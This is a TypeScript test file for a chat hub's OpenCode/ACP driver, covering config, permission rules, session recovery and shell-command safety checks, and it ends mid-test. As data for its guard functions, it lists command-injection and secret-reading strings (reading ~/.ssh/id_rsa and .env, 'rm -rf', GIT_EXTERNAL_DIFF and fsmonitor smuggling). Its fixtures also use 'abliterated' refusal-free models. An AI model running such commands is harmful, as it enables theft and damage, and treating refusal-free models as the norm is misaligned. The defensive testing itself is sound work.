// OpenCode as Crosstalk's harness for an AI service, without OpenCode: what its config says for a chat, how the driver reads a
// scripted `opencode acp` (fixtures/fake-opencode-acp), and how the hub offers it. The real program is in opencode-real.test.ts.
import { afterEach, describe, expect, test } from "bun:test";
import { chmodSync, mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { ApprovalDecision, PermissionMode } from "@crosstalk/shared";
import { AcpDriver } from "../src/agents/acp";
import type { ActivityInput, ApprovalRequest, DriverContext, TurnSink } from "../src/agents/driver";
import { serviceCompactLimit } from "../src/agents/driver";
import { OpenCodeDriver, actualPath, chatPlugin, commandFolder, leavesFolder, openCodeConfig, openCodeInstructions, permissionRules, projectNotes, readsOnly, relativeToChat, staysInFolder, toolTitle } from "../src/agents/opencode";
import { EMPTY_ANSWER_NUDGE, TEXT_TOOL_CALL_GAVE_UP, TEXT_TOOL_CALL_NUDGE, textToolCallAt, withoutTextToolCall } from "../src/agents/toolText";
import { App } from "../src/app";
import { OPENCODE_VERSION, opencodeProvider } from "../src/providers/opencode";
import { fakeRefuseless } from "./fixtures/fake-refuseless";

const FAKE = join(import.meta.dir, "fixtures", "fake-opencode-acp");
const MODEL = "deepseek-v4.1-flash-abliterated";
const KEY = "abl_test_key_0001";
const REFUSED = "Refuseless refused the key — check it in Settings → AI services, then tap Try again.";
const endpoint = { id: "rl", label: "Refuseless", baseUrl: "https://api.refuseless.com", models: [MODEL, "glm-5.3-abliterated"], contextWindow: 1_048_576, key: KEY };

const cleanups: (() => void | Promise<void>)[] = [];
afterEach(async () => {
  for (const c of cleanups.splice(0).reverse()) await c();
});

function folder() {
  const dir = mkdtempSync(join(tmpdir(), "ct-oc-unit-"));
  cleanups.push(() => rmSync(dir, { recursive: true, force: true }));
  return dir;
}

function sinkFor(decisions: ApprovalDecision[] = []) {
  const ac = new AbortController();
  const out = { text: "", activities: [] as (ActivityInput & { detail: string })[], approvals: [] as ApprovalRequest[], usage: [] as Record<string, unknown>[], session: {} as Record<string, unknown>, statuses: [] as string[], beats: 0, stop: () => ac.abort() };
  const sink: TurnSink = {
    text: (d) => void (out.text += d),
    setText: (t) => void (out.text = t),
    activity: (a) => {
      out.activities.push({ ...a, detail: a.detail ?? "" });
      return `a${out.activities.length}`;
    },
    updateActivity: (id, patch) => {
      const a = out.activities[Number(id.slice(1)) - 1];
      const { appendDetail, ...rest } = patch;
      Object.assign(a, Object.fromEntries(Object.entries(rest).filter(([, v]) => v !== undefined)));
      if (appendDetail) a.detail += appendDetail;
    },
    approval: async (req) => {
      out.approvals.push(req);
      return decisions.shift() ?? "deny";
    },
    usage: (u) => void out.usage.push(u as Record<string, unknown>),
    rateLimit: () => {},
    status: (s) => void out.statuses.push(s ?? ""),
    saveSession: (p) => void Object.assign(out.session, p),
    heartbeat: () => void out.beats++,
    newReply: () => {},
    taken: () => {},
    signal: ac.signal,
  };
  return { sink, out };
}

/** The scripted agent's environment: what it does, and where it notes what it's told. */
function scripted(script: unknown) {
  const dir = folder();
  writeFileSync(join(dir, "script.json"), JSON.stringify(script));
  const log = join(dir, "log.jsonl");
  writeFileSync(log, "");
  return { dir, env: { PATH: process.env.PATH ?? "/usr/bin:/bin", FAKE_OC_SCRIPT: join(dir, "script.json"), FAKE_OC_LOG: log }, said: () => readFileSync(log, "utf8").split("\n").filter(Boolean).map((l) => JSON.parse(l)) };
}

function ctxFor(env: Record<string, string>, cwd: string, o: { mode?: PermissionMode; session?: Record<string, unknown>; config?: Record<string, unknown>; endpoint?: typeof endpoint | null } = {}): DriverContext {
  return {
    room: { id: "r1", cwd, name: "Test" },
    member: { id: "mb-oc", provider: "opencode", model: MODEL, permissionMode: o.mode ?? "full", config: o.config ?? {} },
    session: o.session ?? {},
    mcp: { command: "", args: [], env: {} },
    env,
    bin: FAKE,
    chat: null,
    endpoint: o.endpoint === undefined ? endpoint : o.endpoint,
  } as unknown as DriverContext;
}

function driver(script: unknown, o: Parameters<typeof ctxFor>[2] = {}, deps: Partial<NonNullable<ConstructorParameters<typeof OpenCodeDriver>[2]>> = {}) {
  const s = scripted(script);
  const d = new OpenCodeDriver(ctxFor(s.env, s.dir, o), FAKE, { browserUrl: async () => null, runDir: join(s.dir, "run"), settleMs: 0, ...deps });
  cleanups.push(() => d.dispose());
  return { d, ...s };
}

const turn = (prompt = "Go") => ({ turnId: "t1", prompt, systemNote: null, messageIds: [] });
const text = (t: string, meta?: unknown) => ({ u: { sessionUpdate: "agent_message_chunk", content: { type: "text", text: t }, ...(meta ? { _meta: meta } : {}) } });

describe("an agent with a sign-in, over ACP (Gemini CLI): a start refused for want of one reaches the recovery", () => {
  const ACP_WORDS = "Gemini CLI isn't signed in on the hub. Open Settings → AI services.";
  function gemini(script: Record<string, unknown>, session: Record<string, unknown> = {}) {
    const s = scripted(script);
    const ctx = ctxFor(s.env, s.dir, { session, endpoint: null });
    const d = new AcpDriver("gemini", { ...ctx, member: { ...ctx.member, provider: "gemini" } } as DriverContext, [FAKE], { name: "Gemini CLI" });
    cleanups.push(() => d.dispose());
    return { d, ...s };
  }
  const saved = { acpSessionId: "ses_saved" };

  test("session/resume refused with -32000 'Authentication required': the engine's signal, at once, the session kept, and the next message starts over on it", async () => {
    const { d, said } = gemini({ resumeErrors: [{ code: -32000, message: "Authentication required", answered: true }], prompts: [[text("Back.")]] }, saved);
    const { sink, out } = sinkFor();
    const at = Date.now();
    const r = await d.runTurn(turn(), sink);
    expect(r).toMatchObject({ ok: false, error: ACP_WORDS, auth: { kind: "signedOut" } });
    // Not asked again for two minutes: a sign-in isn't what a saved session opening slowly is.
    expect(Date.now() - at).toBeLessThan(5000);
    expect(said().filter((m) => m.method === "session/resume")).toHaveLength(1);
    expect(said().filter((m) => m.method === "session/new")).toEqual([]);
    expect(out.session.acpSessionId).toBeUndefined();
    // Whether a session is open is kept per process (`openOn`): the process that failed isn't reused, and nothing was lost.
    const again = sinkFor();
    expect(await d.runTurn(turn(), again.sink)).toEqual({ ok: true });
    expect(again.out.text).toBe("Back.");
    expect(said().filter((m) => m.method === "initialize")).toHaveLength(2);
    expect(said().filter((m) => m.method === "session/resume").every((m) => m.params.sessionId === "ses_saved")).toBe(true);
  });

  test("an internal error whose details start with invalid_grant, on session/resume: stale, and not asked for again", async () => {
    const { d, said } = gemini({ resumeErrors: [{ code: -32603, message: "Internal error", data: { details: "invalid_grant: Token has been expired or revoked." } }], prompts: [[text("Back.")]] }, saved);
    const at = Date.now();
    const r = await d.runTurn(turn(), sinkFor().sink);
    expect(r.auth?.kind).toBe("stale");
    expect(r.ok).toBe(false);
    expect(Date.now() - at).toBeLessThan(5000);
    expect(said().filter((m) => m.method === "session/resume")).toHaveLength(1);
  });

  test("session/new refused the same way is the same signal, and the process that said so isn't left for the next message", async () => {
    const { d, said } = gemini({ newFails: [{ code: -32000, message: "Authentication required" }], prompts: [[text("Fine now.")]] });
    expect(await d.runTurn(turn(), sinkFor().sink)).toMatchObject({ ok: false, error: ACP_WORDS, auth: { kind: "signedOut" } });
    const again = sinkFor();
    expect(await d.runTurn(turn(), again.sink)).toEqual({ ok: true });
    expect(again.out.text).toBe("Fine now.");
    expect(said().filter((m) => m.method === "initialize")).toHaveLength(2);
  });

  test("anything else in the way of a saved session is no sign-in: a process gone, whatever it printed, and one still starting", async () => {
    const gone = gemini({ resumeErrors: [{ code: -32000, message: "exits" }] }, saved);
    const r = await gone.d.runTurn(turn(), sinkFor().sink);
    expect(r.ok).toBe(false);
    expect(r.error).toContain("Nothing is lost");
    expect(r.auth).toBeUndefined();
    const busy = gemini({ resumeErrors: [{ code: -32603, message: "still starting" }], prompts: [[text("Back.")]] }, saved);
    expect(await busy.d.runTurn(turn(), sinkFor().sink)).toEqual({ ok: true });
    expect(busy.said().filter((m) => m.method === "session/resume")).toHaveLength(2);
  });

  test("a prompt refused for want of one is the same signal; a limit in other words stays a limit", async () => {
    const { d } = gemini({ prompts: [[{ error: { code: -32000, message: "Authentication required" } }]] });
    expect(await d.runTurn(turn(), sinkFor().sink)).toMatchObject({ ok: false, error: "Authentication required", auth: { kind: "signedOut" } });
    const limited = gemini({ prompts: [[{ error: { code: -32603, message: "429 Too many requests" } }]] });
    const r = await limited.d.runTurn(turn(), sinkFor().sink);
    expect(r.auth).toBeUndefined();
    expect(r.limit).toMatchObject({ kind: "rate" });
  });
});

describe("what OpenCode is told about a chat", () => {
  const setup = (o: Partial<Parameters<typeof openCodeConfig>[0]> = {}) => openCodeConfig({ endpoint, model: MODEL, mode: "full", efforts: [], instructions: ["/run/notes.md"], crosstalk: null, browser: null, ...o });

  test("the service as the only provider, the chat's model, and a key that's in the file only", () => {
    const c = setup();
    expect(c.model).toBe(`crosstalk/${MODEL}`);
    expect(c.providers.crosstalk).toMatchObject({ name: "Refuseless", package: "@opencode/ai/providers/openai-compatible", settings: { baseURL: "https://api.refuseless.com/v1", apiKey: KEY } });
    expect(c.providers.crosstalk.models[MODEL]).toMatchObject({ name: "DeepSeek V4.1 Flash 1017 Abliterated", limit: { context: 1_048_576, output: 131_072 }, compatibility: { reasoningField: "reasoning_content" } });
    expect(Object.keys(c.providers.crosstalk.models)).toEqual([MODEL, "glm-5.3-abliterated"]);
    expect(c.policies).toEqual([{ action: "provider.use", resource: "*", effect: "deny" }, { action: "provider.use", resource: "crosstalk", effect: "allow" }]);
    expect(c.update).toBe("disable");
    expect(c.agents.title).toEqual({ disabled: true });
    expect(c.experimental).toEqual({ todo: true });
    expect(c.instructions).toEqual(["/run/notes.md"]);
    // A service with no key has none in its config.
    expect(setup({ endpoint: { ...endpoint, key: "" } }).providers.crosstalk.settings).toEqual({ baseURL: "https://api.refuseless.com/v1" });
  });

  test("a chat's thinking levels as variants, by the names the service takes", () => {
    const c = setup({ efforts: ["off", "low", "high", "max"] });
    expect(c.providers.crosstalk.models[MODEL].variants).toEqual(["off", "low", "high", "max"].map((e) => ({ id: e, body: { reasoning_effort: e } })));
    expect(c.providers.crosstalk.models["glm-5.3-abliterated"].variants).toBeUndefined();
    expect(setup().providers.crosstalk.models[MODEL].variants).toBeUndefined();
  });

  test("a big window compacts at 250k rather than 85% of it, and the chat's own setting wins", () => {
    expect(setup().compaction).toEqual({ auto: true, buffer: 1_048_576 - 250_000, keep: { tokens: 30_000 } });
    expect(setup({ config: { autoCompact: 400_000 } }).compaction.buffer).toBe(1_048_576 - 400_000);
    // A small window: three quarters of it, with at least what OpenCode itself keeps free.
    expect(setup({ endpoint: { ...endpoint, contextWindow: 32_768 } }).compaction.buffer).toBe(16_000);
    expect(setup({ endpoint: { ...endpoint, contextWindow: null } }).compaction).toBeUndefined();
    expect(serviceCompactLimit({}, { contextWindow: 200_000 })).toBe(150_000);
    expect(serviceCompactLimit({}, { contextWindow: 2_000_000 })).toBe(250_000);
    expect(serviceCompactLimit({}, null)).toBeNull();
  });

  test("the chat's permission setting: for its main agent and its subagents, with Code Mode and questions off", () => {
    const effect = (mode: PermissionMode, action: string, resource = "*") => permissionRules(mode).filter((r) => r.action === action && r.resource === resource).at(-1)?.effect;
    expect([effect("full", "shell"), effect("full", "edit"), effect("full", "browseros_*")]).toEqual(["allow", "allow", "allow"]);
    expect([effect("ask", "shell"), effect("ask", "edit"), effect("ask", "browseros_*")]).toEqual(["ask", "ask", "ask"]);
    expect([effect("edits", "shell"), effect("edits", "edit"), effect("edits", "browseros_*")]).toEqual(["ask", "allow", "ask"]);
    // Auto's reads are the driver's to answer: OpenCode's own rules match raw text, redirections and all.
    expect([effect("auto", "shell"), effect("auto", "edit")]).toEqual(["ask", "allow"]);
    expect(permissionRules("auto").filter((r) => r.action === "shell").map((r) => r.effect)).toEqual(["ask"]);
    // Git's own files can run programs, so they ask wherever other edits don't.
    for (const m of ["edits", "auto"] as PermissionMode[]) for (const path of [".git/*", "*/.git/*"]) expect(effect(m, "edit", path)).toBe("ask");
    // Reading the project never asks, but for its .env; below Full, what's beyond the project does, and fetching.
    for (const m of ["full", "ask", "edits", "auto"] as PermissionMode[]) expect(effect(m, "read")).toBe("allow");
    for (const m of ["ask", "edits", "auto"] as PermissionMode[]) {
      expect([effect(m, "read", "*.env"), effect(m, "read", "*.env.*"), effect(m, "external_directory"), effect(m, "webfetch")]).toEqual(["ask", "ask", "ask", "ask"]);
    }
    // In every mode: a tool that can only fail, and OpenCode's own that check nothing.
    for (const m of ["full", "ask", "edits", "auto"] as PermissionMode[]) expect([effect(m, "websearch"), effect(m, "opencode_*")]).toEqual(["deny", "deny"]);
    // The hub's own folder, with every saved key: refused whatever is approved, from outside it or from a chat holding it.
    const hub = permissionRules("edits", { hub: "/nowhere/me/.crosstalk", data: "/nowhere/me/.local/share", tmp: "/nowhere/tmp" });
    expect(hub).toContainEqual({ action: "external_directory", resource: "/nowhere/me/.crosstalk/*", effect: "deny" });
    for (const f of ["run/*", "secrets.json", "accounts/*", "crosstalk.db*", "config.json", "vapid.json", "ssh/*", "backups/*"]) for (const action of ["read", "edit"]) expect(hub).toContainEqual({ action, resource: `*.crosstalk/${f}`, effect: "deny" });
    // Only OpenCode's own folder for its saved output, not any folder of that name.
    expect(hub).toContainEqual({ action: "external_directory", resource: "/nowhere/me/.local/share/opencode/tool-output/*", effect: "allow" });
    // And its temporary folder, which its own prompt tells the model is approved.
    expect(hub.filter((r) => r.action === "external_directory" && r.effect === "allow").map((r) => r.resource)).toEqual(["/nowhere/me/.local/share/opencode/tool-output/*", "/nowhere/me/.local/share/opencode/shell/*", "/nowhere/tmp/opencode/*"]);
    // A search would go through a hub's files inside the chat's folder, so there's none in such a chat.
    expect(hub.some((r) => r.action === "grep")).toBe(false);
    expect(permissionRules("edits", { hub: "/nowhere/me/.crosstalk", cwd: "/nowhere/me" })).toContainEqual({ action: "grep", resource: "*", effect: "deny" });
    expect(permissionRules("edits", { hub: "/nowhere/me/.crosstalk", cwd: "/nowhere/me/work" }).some((r) => r.action === "grep")).toBe(false);
    // What a project's own node_modules could run after an edit: not below Full.
    expect(setup({ mode: "edits" }).formatter).toBe(false);
    expect(setup({ mode: "full" }).formatter).toBeUndefined();
    const ask = setup({ mode: "ask" });
    expect(ask.permissions).toEqual(expect.arrayContaining([{ action: "execute", resource: "*", effect: "deny" }, { action: "question", resource: "*", effect: "deny" }]));
    // Each agent has them: a subagent doesn't inherit its parent's, and `explore` allows commands and fetches by itself.
    expect(ask.agents.build.permissions).toEqual(ask.permissions);
    const explore = ask.agents.explore.permissions;
    expect(explore).toContainEqual({ action: "shell", resource: "*", effect: "ask" });
    expect(explore).toContainEqual({ action: "webfetch", resource: "*", effect: "ask" });
    expect(explore).toContainEqual({ action: "external_directory", resource: "*", effect: "ask" });
    expect(explore.some((r: { action: string }) => r.action === "edit")).toBe(false);
    expect(ask.agents.general.permissions).toEqual(permissionRules("ask"));
    // Never a rule for everything: it would hand a subagent back what its own rules take away.
    expect(ask.agents.general.permissions.some((r: { action: string }) => r.action === "*")).toBe(false);
  });

  test("Crosstalk's tools and BrowserOS neo with Code Mode off, only when the chat gets them", () => {
    expect(setup().mcp).toEqual({ servers: {} });
    const c = setup({ crosstalk: { command: ["/hub", "mcp"], environment: { A: "1" } }, browser: "http://127.0.0.1:9010/mcp" });
    expect(c.mcp.servers.crosstalk).toEqual({ type: "local", command: ["/hub", "mcp"], environment: { A: "1" }, codemode: false });
    expect(c.mcp.servers.browseros).toEqual({ type: "remote", url: "http://127.0.0.1:9010/mcp", oauth: false, codemode: false });
  });

  test("standing instructions for a phone and a long job, and the project's AGENTS.md, or its CLAUDE.md where it has none", () => {
    const words = openCodeInstructions({ browser: true, notes: "Other computers: a MacBook." });
    expect(words).toContain("Carry the task through to the end");
    expect(words).toContain("Don't commit, push or deploy unless");
    expect(words).toContain("browseros_run");
    expect(words).toContain("Other computers: a MacBook.");
    expect(words).not.toMatch(/\brefuse\b/i);
    expect(openCodeInstructions({ browser: false })).not.toContain("BrowserOS");

    const root = folder();
    mkdirSync(join(root, ".git"));
    writeFileSync(join(root, "CLAUDE.md"), "root");
    const sub = join(root, "a", "b");
    mkdirSync(sub, { recursive: true });
    writeFileSync(join(root, "a", "CLAUDE.md"), "a");
    writeFileSync(join(root, "a", "AGENTS.md"), "a");
    writeFileSync(join(sub, "CLAUDE.md"), "b");
    expect(projectNotes(sub)).toEqual([join(root, "CLAUDE.md"), join(root, "a", "AGENTS.md"), join(sub, "CLAUDE.md")]);
    // Outside a git project, only the working folder's own.
    const loose = folder();
    writeFileSync(join(loose, "CLAUDE.md"), "x");
    const inner = join(loose, "inner");
    mkdirSync(inner);
    expect(projectNotes(inner)).toEqual([]);
    expect(projectNotes(loose)).toEqual([join(loose, "CLAUDE.md")]);
    // A link in the project: read if what it names is in the project, or the file beside it if not.
    const linked = folder();
    const outside = folder();
    mkdirSync(join(linked, ".git"));
    mkdirSync(join(linked, "docs"));
    writeFileSync(join(linked, "docs", "agent.md"), "x");
    symlinkSync(join(linked, "docs", "agent.md"), join(linked, "AGENTS.md"));
    expect(projectNotes(linked)).toEqual([join(linked, "AGENTS.md")]);
    const away = folder();
    mkdirSync(join(away, ".git"));
    writeFileSync(join(outside, "secrets.json"), "x");
    symlinkSync(join(outside, "secrets.json"), join(away, "AGENTS.md"));
    expect(projectNotes(away)).toEqual([]);
    writeFileSync(join(away, "CLAUDE.md"), "x");
    expect(projectNotes(away)).toEqual([join(away, "CLAUDE.md")]);
  });

  test("Auto's commands that only read, and everything that looks like one", () => {
    for (const c of ["ls -la", "cat a.txt", "git status --short", "git diff", "git log --oneline -5", "git show HEAD", "git rev-parse HEAD", "git branch", "git branch --show-current", "grep -n foo src/a.ts", "grep -rn foo src", "wc -l a.txt | head -1", "cat a.txt 2>/dev/null", "cat a.txt 2> /dev/null", "cat <a.txt", "git log main..other --oneline", "git diff main..other", "grep -c process.env a.txt"]) expect([c, readsOnly(c)]).toEqual([c, true]);
    for (const c of [
      // They change things.
      "git branch -D keep", "git branch -m a b", "git branch new", "cat a > b", "cat a >> ~/.zshrc", "ls > out", "cat < a > b", "cat > y <<'EOF'\nx\nEOF", "git log --output=x", "git diff --outp=x", 'git diff "--output=x"', "git diff *", "git status && rm -rf build", "cat a | sh", "cat a.txt | tee x",
      // They run something else.
      "export GIT_EXTERNAL_DIFF='touch x; true'; git diff", "PATH=./bin:$PATH; ls", "git -c core.fsmonitor=./x status", "git diff --ext-diff", "./bin/ls", "rg --pre ./x a", "cat $(touch x; echo a)", "ls =(touch x)", "ls *(e:'touch x':)", "ls $'\\'' ; touch x ; ls \\'",
      // They read what the chat's setting says asks.
      "cat $OPENCODE_CONFIG", "cat /etc/hosts", "cat ~/.ssh/id_rsa", "cat ../other/a", "grep -r x ~", "grep -f/etc/hosts a", "git diff --no-index /dev/null /etc/hosts", "git diff --no-index a b", "cat .env", "grep X .env.production", "cat .ENV", "grep -n M .Env", "cat prod.env", "cat </etc/hosts", "head -1 <~/id_rsa", "cat a.txt;cat </etc/hosts", "cat sub/../../x", "cat ./../x",
      // A glob could match a link, a .env or a file named like an option; these follow links out of the project.
      "cat *", "cat .en*", "ls src/*.ts", "grep -R x .", "grep -rS x .",
    ]) expect([c, readsOnly(c)]).toEqual([c, false]);
  });

  test("what a command names stays in the chat's folder, links followed", () => {
    const root = folder();
    const elsewhere = folder();
    writeFileSync(join(root, "a.txt"), "a");
    writeFileSync(join(elsewhere, "b.txt"), "b");
    symlinkSync(join(elsewhere, "b.txt"), join(root, "out.txt"));
    symlinkSync(elsewhere, join(root, "outdir"));
    symlinkSync(join(root, "a.txt"), join(root, "in.txt"));
    expect(staysInFolder("cat a.txt", root)).toBe(true);
    expect(staysInFolder("cat in.txt", root)).toBe(true);
    expect(staysInFolder("cat new-file.txt", root)).toBe(true);
    expect(staysInFolder("cat out.txt", root)).toBe(false);
    expect(staysInFolder('cat "out.txt"', root)).toBe(false);
    expect(staysInFolder("cat outdir/b.txt", root)).toBe(false);
    expect(staysInFolder("ls outdir", root)).toBe(false);
    // However the name is set off from what's around it.
    symlinkSync(elsewhere, join(root, "my dir"));
    for (const c of ["cat out.txt|wc -l", "cat out.txt;ls", "cat out.txt&&ls", "cat <out.txt", 'cat "my dir/b.txt"', "cat my\\ dir/b.txt", 'cat "my dir"/b.txt']) expect([c, staysInFolder(c, root)]).toEqual([c, false]);
    for (const c of ["cat a.txt|wc -l", "cat <a.txt", "grep 'x;y' a.txt", 'grep -n "a b" a.txt']) expect([c, staysInFolder(c, root)]).toEqual([c, true]);
    // The chat's own folder by its full name reads like any other part of it.
    expect(relativeToChat(`cat ${root}/a.txt`, root)).toBe("cat ./a.txt");
    expect(relativeToChat(`ls ${root}`, root)).toBe("ls .");
    expect(relativeToChat(`cat ${root}x/a.txt`, root)).toBe(`cat ${root}x/a.txt`);
    expect(readsOnly(relativeToChat(`cat ${root}/../x`, root))).toBe(false);
    // A link to something not there yet counts as what it names: writing to it creates that.
    symlinkSync(join(elsewhere, "not-yet.txt"), join(root, "dangling.txt"));
    expect(actualPath(join(root, "dangling.txt"))).toBe(join(actualPath(elsewhere), "not-yet.txt"));
    symlinkSync(join(root, "loop-b"), join(root, "loop-a"));
    symlinkSync(join(root, "loop-a"), join(root, "loop-b"));
    expect(typeof actualPath(join(root, "loop-a"))).toBe("string");
    expect(actualPath(join(root, "out.txt"))).toBe(actualPath(join(elsewhere, "b.txt")));
    expect(actualPath(join(root, "not", "there"))).toBe(join(actualPath(root), "not", "there"));
    // Changing folder: within it is fine, anywhere else or anywhere it can't tell isn't.
    mkdirSync(join(root, "sub"));
    mkdirSync(join(root, "my-app"));
    for (const c of ["ls", "cd sub && ls", "cd ./sub; ls", "cd my-app && npm test", `cd ${root}/my-app && ls`]) expect([c, leavesFolder(c, root)]).toEqual([c, false]);
    for (const c of ["cd", "cd /tmp && ls", "cd .. && ls", "cd ~ && ls", "cd $HOME", "cd - ", "cd -P x", "cd -- x", "cd outdir", "ls; cd /tmp", "pushd /tmp", "(cd /tmp)", "builtin cd /tmp"]) expect([c, leavesFolder(c, root)]).toEqual([c, true]);
  });

  test("where a command runs: a ~ is never taken as the chat's folder", () => {
    expect(commandFolder(undefined, "/work")).toEqual({ folder: "/work", inChat: true });
    expect(commandFolder("sub", "/work")).toEqual({ folder: "/work/sub", inChat: true });
    expect(commandFolder("/work/sub", "/work")).toEqual({ folder: "/work/sub", inChat: true });
    expect(commandFolder("/elsewhere", "/work")).toEqual({ folder: "/elsewhere", inChat: false });
    expect(commandFolder("..", "/work")).toEqual({ folder: "/", inChat: false });
    expect(commandFolder("/workshop", "/work")).toEqual({ folder: "/workshop", inChat: false });
    expect(commandFolder("~/x", "/work")).toEqual({ folder: "~/x", inChat: false });
  });

  test("the hub's plugin: what it guards is below Full; nothing goes to the background in any mode", () => {
    for (const m of ["ask", "edits", "auto"] as PermissionMode[]) {
      expect(chatPlugin(m, "/work")).toContain('": ; "');
      expect(chatPlugin(m, "/work")).toContain("PATH_TOOLS.has");
    }
    expect(chatPlugin("full", "/work")).not.toContain('": ; "');
    expect(chatPlugin("full", "/work")).not.toContain("PATH_TOOLS.has");
    for (const m of ["ask", "full"] as PermissionMode[]) expect(chatPlugin(m, "/work")).toContain("input.background");
    expect(chatPlugin("ask", '/wo"rk')).toContain('const CWD = "/wo\\"rk";');
  });

  test("a tool call's card says what it does", () => {
    const t = (name: string, input: unknown, path?: string) => toolTitle(name, input, path, "/work");
    expect(t("shell", { command: "ls -la" })).toBe("ls -la");
    expect(t("read", { path: "a.txt" })).toBe("Read a.txt");
    expect(t("edit", {}, "/work/src/a.ts")).toBe("Edit src/a.ts");
    expect(t("write", { path: "/elsewhere/b" })).toBe("Write /elsewhere/b");
    expect(t("grep", { pattern: "foo" })).toBe("Search for foo");
    expect(t("glob", { pattern: "**/*.ts" })).toBe("List **/*.ts");
    expect(t("webfetch", { url: "https://x.example" })).toBe("Fetch https://x.example");
    expect(t("grep", { pattern: "foo", path: "/elsewhere" })).toBe("Search for foo in /elsewhere");
    expect(t("glob", { pattern: "*", path: "/work/src" })).toBe("List * in src");
    expect(t("subagent", { description: "Look around" })).toBe("Subagent: Look around");
    expect(t("browseros_run", {})).toBe("BrowserOS neo: run");
    expect(t("browseros_navigate", { url: "https://x.example" })).toBe("BrowserOS neo: navigate https://x.example");
    expect(t("crosstalk_list_chats", {})).toBe("Crosstalk: list chats");
    expect(t("something_new", {})).toBe("something_new");
  });
});

describe("a tool call written out as text", () => {
  test("DeepSeek's tokens anywhere outside code, plainer tags only at a line's start near the end", () => {
    const dsml = 'Let me read it.\n<｜DSML｜tool_calls>\n<｜DSML｜invoke name="read">\n</｜DSML｜invoke>\n</｜DSML｜tool_calls>';
    expect(textToolCallAt(dsml)).toBe("Let me read it.\n".length);
    expect(withoutTextToolCall(dsml)).toBe("Let me read it.");
    expect(textToolCallAt("</｜DSML｜parameter>")).toBe(0);
    expect(textToolCallAt("<|DSML|invoke>")).toBe(0);
    expect(textToolCallAt("<｜tool▁calls▁begin｜>")).toBe(0);
    expect(textToolCallAt("Reading it.\n<function=read>\n{}\n</function>")).toBe("Reading it.\n".length);
    expect(textToolCallAt('<tool_call>\n{"name":"read"}\n</tool_call>')).toBe(0);
    expect(textToolCallAt('Now:\n  <invoke name="read">')).toBeGreaterThan(0);
  });

  test("an answer about tool calls isn't one", () => {
    expect(textToolCallAt("All done, nothing odd here.")).toBe(-1);
    expect(textToolCallAt("The parser looks for a <tool_call> tag in the text.")).toBe(-1);
    expect(textToolCallAt("```xml\n<｜DSML｜tool_calls>\n<tool_call>\n```\nThat is the format.")).toBe(-1);
    expect(textToolCallAt("Here it is:\n~~~\n<function=read>\n~~~")).toBe(-1);
    // A plain tag quoted far from the end of a long answer.
    expect(textToolCallAt(`<tool_call>\n${"x".repeat(5000)}\nEnd.`)).toBe(-1);
    expect(withoutTextToolCall("Nothing to take out.")).toBe("Nothing to take out.");
  });
});

describe("the ACP driver", () => {
  const caps = { loadSession: true };
  const replay = [{ sessionUpdate: "agent_message_chunk", content: { type: "text", text: "OLD CONVERSATION" } }, { sessionUpdate: "tool_call", toolCallId: "old", title: "Old tool", kind: "other", status: "completed" }];

  test("loading a saved session plays its old conversation back, and none of it lands in the new reply", async () => {
    const s = scripted({ caps, replay, prompts: [[text("New words.")]] });
    const d = new AcpDriver("gemini", { ...ctxFor(s.env, s.dir, { session: { acpSessionId: "ses_saved" } }), mcp: { command: "x", args: [], env: {} } }, [FAKE], { name: "Gemini CLI" });
    cleanups.push(() => d.dispose());
    const { sink, out } = sinkFor();
    expect(await d.runTurn(turn(), sink)).toEqual({ ok: true });
    expect(out.text).toBe("New words.");
    expect(out.activities).toEqual([]);
    expect(s.said().map((m) => m.method).filter(Boolean)).toEqual(["initialize", "session/load", "session/prompt"]);
  });

  test("an agent that can resume is resumed, not played back", async () => {
    const { d, said } = driver({ replay, prompts: [[text("Picked up.")]] }, { session: { acpSessionId: "ses_saved" } });
    const { sink, out } = sinkFor();
    expect(await d.runTurn(turn(), sink)).toEqual({ ok: true });
    expect(out.text).toBe("Picked up.");
    expect(out.session.acpSessionId).toBeUndefined();
    expect(said().map((m) => m.method).filter(Boolean)).toEqual(["initialize", "session/resume", "session/set_config_option", "session/prompt"]);
  });

  test("a session that can't be picked up starts a new one", async () => {
    const { d, said } = driver({ resumeFails: true, prompts: [[text("Fresh.")]] }, { session: { acpSessionId: "ses_gone" } });
    const { sink, out } = sinkFor();
    expect(await d.runTurn(turn(), sink)).toEqual({ ok: true });
    expect(out.session.acpSessionId).toBe("ses_fake");
    expect(said().map((m) => m.method).filter(Boolean)).toEqual(["initialize", "session/resume", "session/new", "session/set_config_option", "session/prompt"]);
  });

  test("a tool still running counts as a sign of life, however quiet; with none running, nothing does", async () => {
    const tool = { sessionUpdate: "tool_call", toolCallId: "t1", name: "shell", title: "shell", kind: "execute", status: "pending", rawInput: {} };
    const { d } = driver({ prompts: [[{ u: tool }, { sleep: 260 }, { u: { sessionUpdate: "tool_call_update", toolCallId: "t1", status: "completed" } }, { sleep: 260 }, text("Done.")]] }, {}, { beatMs: 50 });
    const { sink, out } = sinkFor();
    expect(await d.runTurn(turn(), sink)).toEqual({ ok: true });
    expect(out.beats).toBeGreaterThanOrEqual(3);
    expect(out.beats).toBeLessThanOrEqual(6);
  });
});

describe("OpenCode's driver", () => {
  test("the chat's own model and effort are set on every start, whatever a project says; no MCP servers on the session (they're in the file)", async () => {
    const { d, said, dir } = driver({ prompts: [[text("Hi.")]] }, { config: { effort: "max" } });
    expect(await d.runTurn(turn(), sinkFor().sink)).toEqual({ ok: true });
    const m = said();
    expect(m.find((x) => x.method === "session/new").params.mcpServers).toEqual([]);
    expect(m.filter((x) => x.method === "session/set_config_option").map((x) => [x.params.configId, x.params.value])).toEqual([["model", `crosstalk/${MODEL}`], ["effort", "max"]]);
    // The config is a file only this user can read, and the process is told where it is: no key in its environment.
    const file = join(dir, "run", "opencode", "mb-oc.json");
    expect(Bun.file(file).size).toBeGreaterThan(0);
    expect((await Bun.file(file).json()).providers.crosstalk.models[MODEL].variants.map((v: { id: string }) => v.id)).toEqual(["max"]);
    await d.dispose();
    expect(await Bun.file(file).exists()).toBe(false);
  });

  test("without a service or a model it says what to do", async () => {
    const none = driver({}, { endpoint: null });
    expect((await none.d.runTurn(turn(), sinkFor().sink)).error).toContain("runs on an AI service");
    const noModels = driver({}, { endpoint: { ...endpoint, models: [] } });
    (noModels.d as unknown as { ctx: DriverContext }).ctx.member.model = null;
    expect((await noModels.d.runTurn(turn(), sinkFor().sink)).error).toContain("Pick a model for Refuseless");
  });

  test("usage adds up over the prompts of a reply, the cached part inside the input; context as last said", async () => {
